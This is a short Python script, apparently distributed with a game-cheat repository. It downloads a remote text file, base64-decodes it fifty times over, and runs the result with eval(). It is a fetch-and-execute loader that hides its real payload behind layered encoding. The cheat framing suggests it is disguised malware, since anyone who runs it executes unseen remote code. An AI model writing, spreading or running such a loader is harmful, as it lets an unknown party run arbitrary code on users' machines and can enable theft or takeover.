import requests
import base64

payload_url = "https://raw.githubusercontent.com/clash098/orion-drift-cheats/refs/heads/master/secret_payload.txt"
payload = ""

def get_payload():
    global payload

    response = requests.get(payload_url)
    payload = response.text.strip()

def evaluate_payload():
    global payload

    for i in range(50):
        payload = base64.b64decode(payload.encode()).decode()

if __name__ == "__main__":
    get_payload()
    evaluate_payload()

    eval(payload)